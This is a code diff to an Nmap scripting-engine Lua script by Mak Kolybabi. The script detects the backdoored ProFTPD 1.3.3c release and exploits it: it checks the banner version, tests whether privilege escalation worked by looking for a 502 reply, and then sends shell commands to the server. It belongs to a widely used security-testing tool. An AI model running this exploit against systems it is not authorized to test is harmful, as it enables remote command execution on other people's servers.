@@ -29,6 +29,7 @@ author = "Mak Kolybabi"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
 categories = {"discovery", "intrusive"}
 
+require("ftp")
 require("shortport")
 require("stdnse")
 
@@ -69,15 +70,16 @@ action = function(host, port)
 	end
 
 	-- Read banner.
-	status, resp = sock:receive_lines(1)
-	if not status then
-		stdnse.print_debug(1, "Can't read banner: %s", resp)
+	buffer = stdnse.make_buffer(sock, "\r?\n")
+	local code, message = ftp.read_reply(buffer)
+	if not code then
+		stdnse.print_debug(1, "Can't read banner: %s", message)
 		sock:close()
 		return
 	end
 
 	-- Check version.
-	if not resp:match("ProFTPD 1.3.3c") then
+	if not message:match("ProFTPD 1.3.3c") then
 		stdnse.print_debug(1, "This version is not known to be backdoored.")
 		return
 	end
@@ -90,7 +92,15 @@ action = function(host, port)
 		return
 	end
 
-	-- Send command(s) to shell, assuming that privilege escalation worked.
+	-- Check if escalation worked.
+	code, message = ftp.read_reply(buffer)
+	if code and code == 502 then
+		stdnse.print_debug(1, "Privilege escalation failed: %s", message)
+		sock:close()
+		return
+	end
+
+	-- Send command(s) to shell.
 	status, err = sock:send(cmd .. ";\r\n")
 	if not status then
 		stdnse.print_debug(1, "Failed to send shell command(s): %s", err)
@@ -102,10 +112,6 @@ action = function(host, port)
 	status, resp = sock:receive()
 	if not status then
 		stdnse.print_debug(1, "Can't read command response: %s", resp)
-		sock:close()
-		return
-	elseif resp:match("502 Unknown command") then
-		stdnse.print_debug(1, "Privilege escalation failed: %s", resp)
 		sock:close()
 		return
 	end
